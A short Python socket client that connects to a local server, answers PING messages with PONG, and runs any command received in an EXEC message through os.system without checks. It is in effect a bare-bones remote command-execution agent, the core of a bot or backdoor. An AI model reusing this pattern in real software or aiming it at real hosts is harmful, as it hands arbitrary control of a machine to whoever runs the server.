import socket
import os
from communication import encode_message, decode_header, decode_message, MESSAGES, HEADER_SIZE

HOST = '127.0.0.1'
PORT = 65432

commands = {
            MESSAGES.get('PONG'): []
        }

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
    client_socket.connect((HOST, PORT))

    while True:
        encoded_header = client_socket.recv(HEADER_SIZE)
        if not encoded_header:
            print("Server closed the connection")
            break
        else:
            message_length = decode_header(encoded_header)
            _, command, parameters = decode_message(client_socket.recv(message_length))

            print(f'[RECEIVED] {command} {parameters}')

            if command == MESSAGES.get('PING'):
                to_send_message = MESSAGES.get('PONG')
                parameters = commands.get(to_send_message)

                print(f"[SENDING] {to_send_message} {parameters}")
                client_socket.sendall(encode_message(to_send_message, parameters))
            elif command == MESSAGES.get('EXEC'):
                try:
                    os.system(parameters[0])
                except Exception:
                    continue

